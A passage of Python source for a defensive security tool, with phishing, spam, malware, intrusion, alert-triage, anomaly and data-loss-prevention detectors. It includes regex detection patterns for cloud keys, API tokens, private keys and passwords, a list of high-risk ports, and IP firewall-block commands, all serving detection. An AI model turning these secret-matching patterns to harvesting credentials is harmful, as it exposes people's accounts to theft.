                tp, fp, fn = int((p & y).sum()), int((p & ~y).sum()), int((~p & y).sum())
                out["label_check"] = {"label_column": lc, "precision": round(tp / (tp + fp), 3) if tp + fp else 0.0,
                                      "recall": round(tp / (tp + fn), 3) if tp + fn else 0.0,
                                      "note": "measured on the uploaded data itself — train/validation metrics are in 'train'"}
        return out

    def info(self) -> dict:
        return {"key": self.key, "title": self.title, "description": self.blurb, "mode": self.mode,
                "input": self.input_help, "dataset_columns": self.columns_help, "mitre": self.mitre,
                "trainable": self.trainable, "trained": bool(self.model),
                "model": None if not self.model else {"kind": self.model.kind, "classes": self.model.classes,
                                                      "metrics": self.model.metrics, "trained_on": self.trained_on}}

    def observe(self, ev: dict) -> list:
        return []


# ═══════════════════════════════════════════════════════════════════════
#  PHISHING
# ═══════════════════════════════════════════════════════════════════════
PH_KW = ("login", "signin", "verify", "secure", "account", "update", "confirm", "password", "banking", "wallet",
         "billing", "suspend", "unlock", "invoice", "validate", "recover", "authenticate", "webscr", "support-")
PH_PHRASES = ("verify your account", "confirm your identity", "account (has been )?(suspended|locked|limited)",
              "unusual (sign.?in|activity)", "within (24|48) hours", "password (will )?expire", "click (here|below|the link)",
              "update your (payment|billing|account)", "security alert", "failure to (comply|respond)", "act immediately",
              "your (mailbox|account) (is )?(full|disabled)", "re-?activate your", "payment (failed|declined)",
              "wire transfer", "gift cards?", "invoice attached", "kindly (provide|send)")


def url_features(u: str) -> dict:
    raw = u.strip()
    s = raw if re.match(r"^[a-z][a-z0-9+.-]*://", raw, re.I) else "http://" + raw
    try:
        p = urllib.parse.urlsplit(s)
        host = (p.hostname or "").lower()
        try:
            port = p.port
        except ValueError:
            port = None
    except ValueError:
        p, host, port = urllib.parse.urlsplit("http://x"), "", None
    labels = host.split(".") if host else []
    tld = labels[-1] if labels else ""
    reg = ".".join(labels[-2:]) if len(labels) >= 2 else host
    low = s.lower()
    return {"url_len": len(raw), "host_len": len(host), "dots": host.count("."), "hyphens": host.count("-"),
            "at": int("@" in (p.netloc or "")), "ip_host": int(is_ip(host)), "puny": int("xn--" in host),
            "nonascii": int(any(ord(c) > 127 for c in host)), "subdepth": max(0, len(labels) - 2),
            "https": int(p.scheme == "https"), "susp_tld": int(tld in SUSP_TLDS), "shortener": int(reg in SHORTENERS),
            "digits_host": sum(c.isdigit() for c in host) / max(1, len(host)), "host_entropy": shannon(host),
            "path_len": len(p.path or ""), "q_len": len(p.query or ""), "kw": sum(k in low for k in PH_KW),
            "brand_misuse": int(any(b in host and reg != f"{b}.com" and not host.endswith(f".{b}.com") for b in BRANDS)),
            "dslash": int("//" in (p.path or "")), "pct": raw.count("%"), "odd_port": int(port not in (None, 80, 443)),
            "_host": host, "_reg": reg, "_tld": tld}


def url_risk(u: str) -> tuple[float, list]:
    f = url_features(u)
    ws, why = [], []

    def add(w, t):
        ws.append(w)
        why.append(t)
    if f["ip_host"]:
        add(.55, "Link uses a raw IP address instead of a domain name")
    if f["at"]:
        add(.55, "URL contains '@' (hides the real destination)")
    if f["puny"] or f["nonascii"]:
        add(.55, "Look-alike (punycode / non-ASCII) characters in the domain")
    if f["brand_misuse"]:
        add(.65, f"Brand name used on an unrelated domain ({f['_reg']})")
    if f["susp_tld"]:
        add(.30, f"Domain ends in .{f['_tld']}, a TLD heavily abused for phishing")
    if f["shortener"]:
        add(.25, "URL shortener hides the destination")
    if f["kw"] >= 2:
        add(min(.6, .2 * f["kw"]), f"{f['kw']} credential-themed keywords in the URL (login/verify/secure…)")
    if f["subdepth"] >= 3:
        add(.30, f"Unusually deep sub-domain nesting ({f['subdepth']} levels)")
    if f["hyphens"] >= 3:
        add(.25, "Many hyphens in the domain name")
    if f["host_entropy"] > 3.8 and f["host_len"] > 14:
        add(.30, "Random-looking domain name (algorithmically generated?)")
    if not f["https"] and f["kw"]:
        add(.20, "Credential-themed page served without HTTPS")
    if f["dslash"] or f["pct"] > 4:
        add(.20, "Redirect / heavy percent-encoding tricks in the path")
    if f["odd_port"]:
        add(.20, "Non-standard port")
    return noisy_or(ws), why


class PhishingDetector(Detector):
    key, title = "phishing", "Phishing Detection"
    blurb = "URL, e-mail and message analysis: look-alike domains, brand abuse, credential bait, link/text mismatch."
    mitre = ["T1566"]
    mode = "text"
    text_key = "url"
    input_help = "A URL, or the full text/HTML of an e-mail."
    columns_help = "url and/or text/body/subject + label (phishing/legit or 1/0). e.g. PhishTank / UCI phishing exports."

    def row_from(self, item):
        if isinstance(item, dict):
            return {nk(k): v for k, v in item.items()}
        s = str(item).strip()
        if len(s) < 300 and " " not in s and "\n" not in s:
            return {"url": s}
        return {"text": s}

    def extra(self, row):
        u = row.get("url") or ""
        f = url_features(u) if u else {}
        out = {k: float(v) for k, v in f.items() if not k.startswith("_")}
        t = " ".join(str(row.get(k, "")) for k in ("text", "body", "subject"))
        out["ph_phrases"] = float(sum(bool(re.search(p, t, re.I)) for p in PH_PHRASES)) if t else 0.0
        return out

    def rules(self, row):
        ws, why, ev = [], [], {}
        u = row.get("url")
        text = " ".join(str(row.get(k, "")) for k in ("text", "body", "subject", "message", "email") if row.get(k))
        urls = [u] if u else []
        urls += IOC_RES["url"].findall(text)[:20]
        worst = 0.0
        for x in dict.fromkeys(urls):
            r, w = url_risk(x)
            if r > worst:
                worst, why_url = r, w
        if urls and worst:
            ws.append(worst)
            why += why_url[:4]
            ev["urls"] = urls[:5]
        if text:
            hits = [p for p in PH_PHRASES if re.search(p, text, re.I)]
            if hits:
                ws.append(min(.75, .22 * len(hits)))
                why.append(f"{len(hits)} social-engineering phrase(s): urgency / account threat / credential request")
            for href, label in re.findall(r"(?is)<a[^>]+href=[\"']([^\"']+)[\"'][^>]*>(.*?)</a>", text)[:20]:
                lab = re.sub(r"<[^>]+>", "", label)
                m = IOC_RES["domain"].search(lab)
                hh = (urllib.parse.urlsplit(href).hostname or "").lower()
                if m and hh and m.group(0).lower().split("/")[0] not in hh:
                    ws.append(.8)
                    why.append(f"Link text shows “{m.group(0)[:40]}” but points to {hh}")
                    break
            if re.search(r"(?i)\.(html?|exe|scr|iso|js|vbs|lnk|zip|img)\b[^\n]{0,20}(attach|open|download)|attach[^\n]{0,30}\.(html?|exe|iso|zip)", text):
                ws.append(.45)
                why.append("Risky attachment type mentioned")
            if re.search(r"(?i)(password|pin|ssn|card number|cvv|otp)\b[^\n]{0,40}(enter|provide|send|reply|confirm)", text):
                ws.append(.55)
                why.append("Asks for credentials or payment details")
        return noisy_or(ws), why, ev


# ═══════════════════════════════════════════════════════════════════════
#  SPAM
# ═══════════════════════════════════════════════════════════════════════
SPAM_TERMS = ("free", "winner", "won", "prize", "lottery", "viagra", "cialis", "casino", "bonus", "cash", "credit",
              "loan", "discount", "offer", "limited time", "act now", "click below", "100%", "guarantee", "no obligation",
              "risk-free", "earn", "income", "work from home", "investment", "crypto", "bitcoin", "inheritance",
              "beneficiary", "million", "urgent", "congratulations", "unsubscribe", "weight loss", "miracle", "dating",
              "pills", "replica", "cheap", "buy now", "order now", "double your")


class SpamDetector(Detector):
    key, title = "spam", "Spam Detection"
    blurb = "Bulk / unsolicited message classifier: promo language, advance-fee scams, shouting, link stuffing."
    mitre = ["T1566"]
    mode = "text"
    input_help = "Paste an e-mail / SMS / comment."
    columns_help = "text/message/body + label (spam/ham). e.g. SMS Spam Collection, Enron-Spam, SpamAssassin."

    def extra(self, row):
        t = str(row.get("text") or row.get("message") or row.get("body") or row.get("v2") or "")
        up = sum(c.isupper() for c in t)
        letters = max(1, sum(c.isalpha() for c in t))
        return {"caps": up / letters, "excl": float(t.count("!")), "links": float(len(IOC_RES["url"].findall(t))),
                "digits": sum(c.isdigit() for c in t) / max(1, len(t)), "len": float(len(t)),
                "terms": float(sum(w in t.lower() for w in SPAM_TERMS)), "money": float(len(re.findall(r"[$€£]\s?\d|\d+\s?(usd|eur|gbp)", t, re.I)))}

    def rules(self, row):
        t = str(row.get("text") or row.get("message") or row.get("body") or row.get("v2") or "")
        if not t:
            return 0.0, [], {}
        ex = self.extra(row)
        ws, why = [], []
        if ex["terms"] >= 2:
            ws.append(min(.8, .16 * ex["terms"]))
            why.append(f"{int(ex['terms'])} typical spam terms (free / prize / offer / earn …)")
        if ex["caps"] > .45 and len(t) > 20:
            ws.append(.35)
            why.append("Excessive capital letters")
        if ex["excl"] >= 3:
            ws.append(.3)
            why.append("Repeated exclamation marks")
        if ex["links"] >= 3 or any(s in t.lower() for s in SHORTENERS):
            ws.append(.4)
            why.append("Many links / shortened links")
        if ex["money"] >= 2:
            ws.append(.35)
            why.append("Multiple money amounts")
        if re.search(r"(?i)(reply (stop|yes)|text stop|call now|\b\d{5,6}\b.*(send|text)|claim (your|now))", t):
            ws.append(.5)
            why.append("Call-to-action pattern common in SMS spam")
        if re.search(r"(?i)(beneficiary|next of kin|transfer of \$?\d|inheritance|dormant account)", t):
            ws.append(.7)
            why.append("Advance-fee (419) scam wording")
        return noisy_or(ws), why, {}


# ═══════════════════════════════════════════════════════════════════════
#  MALWARE (files + feature tables)
# ═══════════════════════════════════════════════════════════════════════
class MalwareDetector(Detector):
    train_label = "🧠 Train / load hashes"
    key, title = "malware", "Malware Detection"
    blurb = ("Static file analysis (entropy, packers, disguised executables, polyglots, suspicious API/script markers, "
             "hash IOCs) + a learned model on feature datasets. Never executes the file.")
    mitre = ["T1027", "T1036", "T1059"]
    mode = "file"
    input_help = "Pick a file to scan (it is only read, never run)."
    columns_help = ("Feature table with a label (malware/benign) – e.g. EMBER/BODMAS exports – OR columns named like this app's "
                    "own features: " + ", ".join(FEATURE_NAMES[:8]) + "… (use 'Build dataset from folders'). A column "
                    "named sha256/md5 with label=malicious loads hash IOCs.")
    use_extra = False

    def subject_of(self, row):
        return str(row.get("sha256") or row.get("name") or row.get("file") or dumps(row)[:100])

    def rules(self, row):
        ws, why = [], []
        h = str(row.get("sha256") or row.get("hash") or "").lower()
        if h and h in self.hub.ioc_hashes:
            ws.append(.98)
            why.append("Hash is in your malicious-hash IOC list")
        e = fnum(row.get("entropy"))
        if e is not None and e > 7.2:
            ws.append(.4)
            why.append(f"High entropy ({e:.1f}) suggests packing/encryption")
        if str(row.get("packed", "")).lower() in ("1", "true", "yes"):
            ws.append(.35)
            why.append("Marked as packed")
        return noisy_or(ws), why, {}

    def train(self, table, label=None, contamination=0.02):
        cols = set(table.columns)
        hc = next((c for c in ("sha256", "sha1", "md5", "hash") if c in cols), None)
        lc = detect_label(table.rows, label)
        if hc:                                                 # harvest known-bad hashes as IOCs
            n = 0
            for r in table.rows:
                lab = norm_labels([r.get(lc, "malicious")])[0] if lc else "malicious"
                v = str(r.get(hc, "")).strip().lower()
                if lab == "malicious" and re.fullmatch(r"[a-f0-9]{32,64}", v):
                    self.hub.ioc_hashes.add(v)
                    n += 1
            self.hub.save_iocs()
            if len(set(cols) - {hc, lc or ""}) < 2:           # hash-only list
                self.hub.on_trained(self, {"dataset": table.name, "sha256": table.sha, "rows": len(table), "ts": now(),
                                           "kind": "ioc-list"}, {"hashes_loaded": n})
                return {"module": self.key, "kind": "ioc-list", "metrics": {"hashes_loaded": n}}
        return super().train(table, label, contamination)

    def analyze(self, item, **kw):
        if isinstance(item, str) and os.path.isfile(item):
            return self.analyze_file(item)
        if isinstance(item, str) and re.fullmatch(r"(?i)[a-f0-9]{32,64}", item.strip()):
            return super().analyze({"sha256": item.strip().lower()})
        return super().analyze(item, **kw)

    def analyze_file(self, path: str) -> dict:
        r = file_features_and_findings(path, self.hub.ioc_hashes, self.hub.cs_probe)
        rs = noisy_or(r["weights"])
        reasons = list(r["reasons"])
        ev = {"sha256": r["sha256"], "size": r["size"], "type": r["kind"], "entropy": round(r["entropy"], 2),
              "features": r["features"]}
        if r["steg"] and "error" not in r["steg"]:
            ev["steganalysis"] = {k: v for k, v in r["steg"].items() if k != "series"}
        score = rs
        if self.model and self.model.fs and len({c["name"] for c in self.model.fs.cols} & set(FEATURE_NAMES)) >= 3:
            ml = self.model.score_row(r["features"])
            if ml:
                score = self.combine(rs, ml)
                reasons.append(f"Learned model ({self.trained_on['dataset']}): {ml['label']} ({ml['score'] * 100:.0f}%)")
                ev["ml"] = ml
        f = make_finding(self.key, os.path.basename(path), score * 100, reasons or ["No malware indicators found"],
                         ev, r["mitre"] or self.mitre, entity=r["sha256"])
        f["verdict"] = "malicious" if f["score"] >= 75 else "suspicious" if f["score"] >= 45 else "clean"
        return f


# ═══════════════════════════════════════════════════════════════════════
#  INTRUSION DETECTION & PREVENTION
# ═══════════════════════════════════════════════════════════════════════
class IPS:
    """In-app prevention layer: a TTL blocklist + reviewable firewall commands.
    It NEVER changes your OS firewall – run the printed commands yourself (or wire a webhook)."""

    def __init__(self, hub):
        self.hub, self.lock = hub, threading.RLock()
        self.path = os.path.join(hub.home, "blocklist.json")
        self.entries: dict = {}
        try:
            with open(self.path, encoding="utf-8") as f:
                self.entries = json.load(f)
        except Exception:
            pass

    def _save(self):
        try:
            with open(self.path, "w", encoding="utf-8") as f:
                json.dump(self.entries, f)
        except OSError:
            pass

    @staticmethod
    def commands(ip: str) -> dict:
        v6 = ":" in ip
        return {"linux_iptables": f"sudo {'ip6tables' if v6 else 'iptables'} -I INPUT -s {ip} -j DROP",
                "linux_nftables": f"sudo nft add rule inet filter input ip{'6' if v6 else ''} saddr {ip} drop",
                "windows": f'netsh advfirewall firewall add rule name="CryptoSec block {ip}" dir=in action=block remoteip={ip}',
                "undo_linux": f"sudo iptables -D INPUT -s {ip} -j DROP"}

    def block(self, ip: str, ttl: int = 3600, reason: str = "", score: int = 0) -> dict:
        if not is_ip(ip):
            raise ValueError("not an IP address")
        if ipaddress.ip_address(ip).is_loopback or ip in ("0.0.0.0", "255.255.255.255"):
            raise ValueError("refusing to block loopback / broadcast addresses")
        e = {"ip": ip, "since": now(), "until": now() + ttl, "reason": reason, "score": score,
             "private": is_private_ip(ip), "commands": self.commands(ip)}
        with self.lock:
            self.entries[ip] = e
            self._save()
        if self.hub.pg is not None:
            self.hub.pg.put_block(e)
        self.hub.audit("ips.block", {"ip": ip, "ttl": ttl, "reason": reason[:80], "score": score})
        return e

    def unblock(self, ip: str) -> bool:
        with self.lock:
            ok = self.entries.pop(ip, None) is not None
            self._save()
        if ok and self.hub.pg is not None:
            self.hub.pg.del_block(ip)
        if ok:
            self.hub.audit("ips.unblock", {"ip": ip})
        return ok

    def is_blocked(self, ip: str) -> bool:
        with self.lock:
            e = self.entries.get(ip)
            if e and e["until"] < now():
                self.entries.pop(ip, None)
                return False
            return bool(e)

    def list(self) -> list:
        with self.lock:
            return [e for e in self.entries.values() if e["until"] >= now()]


FLAG_BAD = {"S0", "REJ", "RSTO", "RSTOS0", "SH", "RSTR", "OTH"}


class IntrusionDetector(Detector):
    key, title = "intrusion", "Intrusion Detection & Prevention"
    blurb = ("Signature engine (SQLi, XSS, traversal, RCE, Log4Shell, web shells…) + flow-record classifier. "
             "Prevention: in-app TTL blocklist + ready-to-run firewall commands for attackers above the threshold.")
    mitre = ["T1190", "T1046", "T1498"]
    mode = "table"
    text_key = "payload"
    input_help = "A request line / payload, or a JSON flow record {src_ip, dst_port, flag, src_bytes …}."
    columns_help = ("Flow/packet records + label (normal/attack). NSL-KDD, UNSW-NB15, CIC-IDS columns all work; any text "
                    "column named payload/request/uri/msg is also scanned by the signature engine.")

    def subject_of(self, row):
        ev = norm_event(row)
        return (ev.get("src_ip") or "") + " → " + (str(ev.get("dst_ip") or "") + (f":{ev['dst_port']}" if ev.get("dst_port") else "")) \
            if ev.get("src_ip") else super().subject_of(row)

    def rules(self, row):
        ws, why, ev = [], [], {}
        ev0 = norm_event(row)
        text = " ".join(str(row.get(k, "")) for k in ("payload", "request", "uri", "url", "msg", "message", "line", "text", "user_agent", "ua") if row.get(k))
        text = urllib.parse.unquote(urllib.parse.unquote(text)) if "%" in text else text
        hits = []
        for name, (rx, w, tid) in SIGNATURES.items():
            if rx.search(text):
                ws.append(w)
                why.append(f"Signature match: {name}")
                hits.append(name)
        if hits:
            ev["signatures"] = hits
        g = lambda k: fnum(row.get(k), 0.0) or 0.0
        flag = str(row.get("flag", "")).upper()
        if flag in FLAG_BAD and (g("count") > 100 or g("srv_count") > 100 or g("serror_rate") > .8):
            ws.append(.7)
            why.append(f"Connection flag {flag} with high connection count (SYN-flood / scan pattern)")
        if g("serror_rate") > .9 and g("count") > 50:
            ws.append(.6); why.append("Very high SYN-error rate")
        if g("num_failed_logins") >= 3:
            ws.append(.6); why.append(f"{int(g('num_failed_logins'))} failed logins in one connection")
        if g("root_shell") or g("su_attempted") or g("num_shells") or g("num_root") > 3:
            ws.append(.75); why.append("Root shell / privilege-escalation indicators")
        if g("land"):
            ws.append(.7); why.append("'Land' attack (source = destination)")
        if g("wrong_fragment") > 0 or g("urgent") > 0:
            ws.append(.45); why.append("Malformed packet fragments / urgent flags")
        dp = ev0.get("dst_port")
        if dp in (23, 2323, 4444, 31337, 6667, 1337):
            ws.append(.4); why.append(f"Connection to a high-risk port ({dp})")
        if ev0.get("src_ip") and self.hub.ips.is_blocked(ev0["src_ip"]):
            ws.append(.85); why.append("Source IP is on your active blocklist")
        return noisy_or(ws), why, ev

    def analyze(self, item, **kw):
        f = super().analyze(item, **kw)
        src = norm_event(self.row_from(item)).get("src_ip")
        thr = int(self.hub.setting("ips_threshold", 75))
        if f["score"] >= thr and src and is_ip(src):
            f["evidence"]["prevention"] = {"action": "block", "src_ip": src, "ttl_s": 3600,
                                           "mode": self.hub.setting("ir_mode", "dry-run"),
                                           "commands": IPS.commands(src)}
        return f

    def observe(self, ev):
        raw = ev.get("raw", {})
        if not any(raw.get(k) for k in ("payload", "request", "uri", "url", "msg", "message", "line", "ua", "user_agent")) \
                and not ev.get("msg") and not ev.get("resource"):
            return []
        row = dict(raw)
        if ev.get("msg"):
            row.setdefault("msg", ev["msg"])
        if ev.get("resource"):
            row.setdefault("uri", ev["resource"])
        f = self.analyze(row, ts=ev.get("ts"))
        f["entity"] = ev.get("src_ip") or ""
        return [f] if f["score"] >= 50 else []


# ═══════════════════════════════════════════════════════════════════════
#  SECURITY ALERT CLASSIFICATION
# ═══════════════════════════════════════════════════════════════════════
CATS = {
    "malware": ("malware", "trojan", "virus", "ransom", "backdoor", "botnet", "c2", "cobalt strike", "dropper", "payload", "av detection", "quarantine", "mimikatz", "rootkit", "worm"),
    "phishing": ("phish", "credential harvest", "spoof", "suspicious email", "bec", "impersonat", "malicious link", "spear"),
    "brute_force": ("brute", "failed login", "failed password", "password spray", "credential stuff", "account lockout", "authentication failure", "invalid user"),
    "intrusion": ("intrusion", "exploit", "sql injection", "xss", "rce", "remote code", "shellshock", "log4j", "webshell", "web shell", "traversal", "cve-"),
    "data_exfiltration": ("exfil", "data loss", "dlp", "large upload", "unusual transfer", "bulk download", "sensitive data", "ftp upload", "cloud storage upload"),
    "reconnaissance": ("port scan", "portscan", "recon", "scan detected", "nmap", "enumeration", "sweep", "fingerprint"),
    "denial_of_service": ("ddos", "dos ", "flood", "syn flood", "amplification", "volumetric", "service unavailable"),
    "privilege_abuse": ("privilege", "escalat", "sudo", "admin group", "new admin", "role change", "impossible travel", "mfa fatigue", "dormant account"),
    "policy_violation": ("policy", "unauthorized software", "usb", "shadow it", "torrent", "tor ", "vpn disabled", "compliance"),
    "benign": ("false positive", "test alert", "informational", "scheduled scan", "vulnerability scanner", "heartbeat", "health check"),
}
SEV_WORDS = ((("critical", "ransom", "exfil", "domain admin", "root", "rce", "wormable", "active exploitation", "cobalt strike"), 90),
             (("high", "malware", "exploit", "brute", "privilege", "backdoor", "c2"), 72),
             (("medium", "suspicious", "scan", "anomal", "phish"), 50),
             (("low", "policy", "warning", "info"), 25))
CRIT_ASSET = re.compile(r"(?i)\b(dc\d*|domain|ad|db|database|prod|finance|payroll|hr|vault|hsm|backup|erp|mail|core)\b")
PLAYBOOK_OF = {"malware": "contain_malware", "phishing": "phishing_response", "brute_force": "credential_attack",
               "intrusion": "web_attack", "data_exfiltration": "data_leak", "reconnaissance": "recon_block",
               "denial_of_service": "dos_mitigation", "privilege_abuse": "account_compromise",
               "policy_violation": "policy_ticket", "benign": "close_false_positive"}


class AlertClassifier(Detector):
    key, title = "alerts", "Security Alert Classification"
    blurb = ("Triage engine: assigns category, severity and P1–P4 priority to raw alerts and suggests the response playbook. "
             "Learns your analysts' labels from an uploaded alert history.")
    mitre = []
    mode = "text"
    text_key = "text"
    input_help = "Paste an alert title/description (or JSON with title, description, host, source)."
    columns_help = "alert title/description/source/host + label = category (or severity). Export from your SIEM/ticketing tool."

    def row_from(self, item):
        if isinstance(item, dict):
            return {nk(k): v for k, v in item.items()}
        return {"text": str(item)}

    def _text(self, row):
        return " ".join(str(row.get(k, "")) for k in ("title", "name", "alert", "description", "text", "message",
                                                      "signature", "rule", "summary", "source", "category") if row.get(k))

    def subject_of(self, row):
        return (str(row.get("title") or row.get("name") or row.get("alert") or self._text(row)))[:160]

    def rules(self, row):
        t = self._text(row).lower()
        sc = {c: sum(2 if (len(k) > 6 and k in t) else 1 for k in kws if k in t) for c, kws in CATS.items()}
        best = max(sc, key=sc.get)
        return (sc[best] / (sc[best] + 2.0) if sc[best] else 0.0), [], {"_scores": sc}

    def analyze(self, item, **kw):
        row = self.row_from(item)
        t = self._text(row)
        low = t.lower()
        rs, _, ev0 = self.rules(row)
        sc = ev0["_scores"]
        cat = max(sc, key=sc.get) if sc[max(sc, key=sc.get)] else "unclassified"
        conf = rs if cat != "unclassified" else 0.0
        why = []
        if cat != "unclassified":
            why.append(f"Keyword evidence for “{cat}”: " + ", ".join(k for k in CATS[cat] if k in low)[:100])
        ml = self.model.score_row(row) if self.model and self.model.kind == "supervised" else None
        if ml and max(ml["probs"].values()) < 0.45:
            why.append("Learned model is unsure (<45%) — using keyword evidence")
            ml = None
        if ml:
            cat, conf = ml["label"], max(conf * 0.3, max(ml["probs"].values()))
            why.append(f"Learned model ({self.trained_on['dataset']}) predicts “{cat}” ({conf * 100:.0f}% confidence)")
        sev = 10
        for words, val in SEV_WORDS:
            if any(w in low for w in words):
                sev = val
                break
        sv = str(row.get("severity", "")).lower()
        if sv in SEV_RANK:
            sev = max(sev if sv == "info" else 0, {"info": 10, "low": 30, "medium": 55, "high": 78, "critical": 92}[sv])
        asset_crit = 1.0 + (0.25 if CRIT_ASSET.search(" ".join(str(row.get(k, "")) for k in ("host", "asset", "hostname", "device")) + " " + low) else 0)
        prio_score = clamp((sev / 100) * asset_crit * (0.6 + 0.4 * conf), 0, 1) * 100
        if cat == "benign":
            prio_score *= 0.2
            why.append("Looks like a known benign / informational alert")
        prio = "P1" if prio_score >= 80 else "P2" if prio_score >= 55 else "P3" if prio_score >= 30 else "P4"
        if asset_crit > 1:
            why.append("Touches a business-critical asset (priority raised)")
        ev = {"category": cat, "confidence": round(conf, 3), "priority": prio, "playbook": PLAYBOOK_OF.get(cat, "manual_triage"),
              "severity_estimate": sev_of(sev), "scores": {k: v for k, v in sc.items() if v}}
        if ml:
            ev["probs"] = ml["probs"]
        f = make_finding(self.key, self.subject_of(row), prio_score, why or ["No keyword evidence — manual triage"], ev,
                         [], verdict=f"{prio} · {cat}")
        return f

    def analyze_table(self, table, limit=50000, threshold=0):
        rows = table.rows[:limit]
        fs = [self.analyze(r) for r in rows]
        cnt = collections.Counter(f["evidence"]["category"] for f in fs)
        pr = collections.Counter(f["evidence"]["priority"] for f in fs)
        top = sorted(fs, key=lambda f: -f["score"])
        return {"module": self.key, "dataset": table.name, "rows": len(rows), "flagged": sum(f["evidence"]["priority"] in ("P1", "P2") for f in fs),
                "by_category": dict(cnt), "by_priority": dict(pr), "mode": "learned+rules" if self.model else "rules-only",
                "findings": top[:200]}


# ═══════════════════════════════════════════════════════════════════════
#  GENERIC ANOMALY DETECTION
# ═══════════════════════════════════════════════════════════════════════
class AnomalyDetector(Detector):
    key, title = "anomaly", "Anomaly Detection"
    blurb = ("Domain-agnostic outlier finder: upload ANY table of numeric/categorical/text columns and get an Isolation-Forest "
             "ranking with per-row explanations (which columns look abnormal). No labels needed.")
    mitre = []
    mode = "table"
    input_help = "A JSON record with the same columns as your training dataset."
    columns_help = "Any CSV/JSON. Optional label column (is_anomaly) gives supervised mode."
    use_extra = False

    def analyze_table(self, table, limit=50000, threshold=50):
        rows = table.rows[:limit]
        m = self.model
        ephemeral = m is None
        if ephemeral:
            m = LearnedModel()
            m.fit_anomaly(rows)
        ml = m.score_rows(rows)
        scores = [x["score"] * 100 for x in ml]
        findings = []
        for r, x, s in zip(rows, ml, scores):
            if s >= threshold:
                why = ["Isolation-Forest outlier score " + (f"{x.get('raw', 0):.2f}" if "raw" in x else f"{s:.0f}")]
                tf = x.get("top_features") or []
                why += [f"{n} is {z}σ from normal" for n, z in tf]
                findings.append(make_finding(self.key, dumps(r)[:160], s, why, {"top_features": tf}))
        findings.sort(key=lambda f: -f["score"])
        out = self.table_summary(table, rows, scores, findings)
        out["mode"] = "unsupervised (fitted on this upload)" if ephemeral else "trained model"
        return out

    def analyze(self, item, **kw):
        if not self.model:
            raise ValueError("Train the anomaly model first (upload a dataset), or analyse a whole dataset instead.")
        row = self.row_from(item)
        ml = self.model.score_row(row)
        why = ["Outlier vs. your dataset"] + [f"{n} is {z}σ from normal" for n, z in ml.get("top_features", [])]
        return make_finding(self.key, dumps(row)[:160], ml["score"] * 100, why if ml["score"] >= .5 else ["Within normal range"], {})


# ═══════════════════════════════════════════════════════════════════════
#  DATA LOSS PREVENTION
# ═══════════════════════════════════════════════════════════════════════
def luhn_ok(num: str) -> bool:
    d = [int(c) for c in num if c.isdigit()]
    if not 13 <= len(d) <= 19:
        return False
    s = 0
    for i, x in enumerate(reversed(d)):
        if i % 2:
            x *= 2
            x -= 9 if x > 9 else 0
        s += x
    return s % 10 == 0


def iban_ok(s: str) -> bool:
    s = re.sub(r"\s", "", s).upper()
    if not re.fullmatch(r"[A-Z]{2}\d{2}[A-Z0-9]{10,30}", s):
        return False
    t = s[4:] + s[:4]
    return int("".join(str(int(c, 36)) for c in t)) % 97 == 1


DLP_PATTERNS = (   # name, regex, severity 0-1, validator
    ("Credit card number", re.compile(r"\b(?:\d[ -]?){13,19}\b"), .9, lambda m: luhn_ok(m)),
    ("IBAN", re.compile(r"\b[A-Z]{2}\d{2}(?:[ ]?[A-Z0-9]{4}){2,7}[ ]?[A-Z0-9]{1,4}\b"), .8, iban_ok),
    ("US Social Security number", re.compile(r"\b(?!000|666|9\d\d)\d{3}-(?!00)\d{2}-(?!0000)\d{4}\b"), .85, None),
    ("AWS access key ID", re.compile(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b"), .95, None),
    ("AWS secret key", re.compile(r"(?i)aws.{0,20}(secret|key).{0,5}[=:]\s*['\"]?[A-Za-z0-9/+=]{40}\b"), .95, None),
    ("GitHub token", re.compile(r"\bgh[pousr]_[A-Za-z0-9]{36,}\b"), .95, None),
    ("Slack token", re.compile(r"\bxox[abprs]-[A-Za-z0-9-]{10,}\b"), .9, None),
    ("Google API key", re.compile(r"\bAIza[0-9A-Za-z_\-]{35}\b"), .9, None),
    ("Stripe secret key", re.compile(r"\b[sr]k_live_[0-9A-Za-z]{20,}\b"), .95, None),
    ("JSON Web Token", re.compile(r"\beyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\b"), .8, None),
    ("Private key block", re.compile(r"-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP |ENCRYPTED )?PRIVATE KEY(?: BLOCK)?-----"), 1.0, None),
    ("Password assignment", re.compile(r"(?i)\b(pass(word|wd)?|pwd|secret|api[_-]?key|token)\b\s*[=:]\s*['\"]?[^\s'\"]{6,}"), .75, None),
    ("Connection string", re.compile(r"(?i)\b(postgres|mysql|mongodb(\+srv)?|redis|amqp)://[^\s:@]+:[^\s@]+@"), .9, None),
    ("E-mail address", re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b"), .25, None),
    ("Phone number", re.compile(r"(?<!\d)\+?\d{1,3}[ -]?\(?\d{2,4}\)?[ -]?\d{3}[ -]?\d{3,4}(?!\d)"), .2, lambda m: 10 <= len(re.sub(r"\D", "", m)) <= 15),
    ("Classification marking", re.compile(r"(?i)\b(top secret|strictly confidential|confidential|internal use only|do not distribute)\b"), .5, None),
)


class DLPDetector(Detector):
    train_label = "📥 Import rules / train"
    key, title = "dlp", "Data Loss Prevention"
    blurb = ("Finds payment cards (Luhn-checked), IBANs, SSNs, cloud keys, tokens, private keys, passwords and custom patterns in "
             "text/files — and redacts them. Runs automatically on every message before it is hidden.")
    mitre = ["T1048", "T1552"]
    mode = "text"
    input_help = "Paste any text, or scan a file."
    columns_help = "Custom rules: columns name,pattern(regex),severity(0-1). Or labelled documents (text + sensitive/ok) to learn a classifier."
    use_extra = False

    def __init__(self, hub):
        self.custom: list = []
        super().__init__(hub)
        try:
            with open(os.path.join(hub.home, "dlp_custom.json"), encoding="utf-8") as f:
                self.custom = json.load(f)
        except Exception:
            pass

    def scan_text(self, text: str, max_hits: int = 200) -> list:
        hits = []
        for name, rx, sev, val in DLP_PATTERNS:
            for m in rx.finditer(text):
                s = m.group(0)
                if val is not None and not val(s):
                    continue
                hits.append({"type": name, "severity": sev, "start": m.start(), "end": m.end(),
                             "sample": self._mask(s)})
                if len(hits) >= max_hits:
                    return hits
        for c in self.custom:
            try:
                for m in re.finditer(c["pattern"], text):
                    hits.append({"type": c.get("name", "Custom rule"), "severity": float(c.get("severity", .7)),
                                 "start": m.start(), "end": m.end(), "sample": self._mask(m.group(0))})
            except re.error:
                continue
        for m in re.finditer(r"[A-Za-z0-9+/_=-]{28,}", text):       # high-entropy secrets
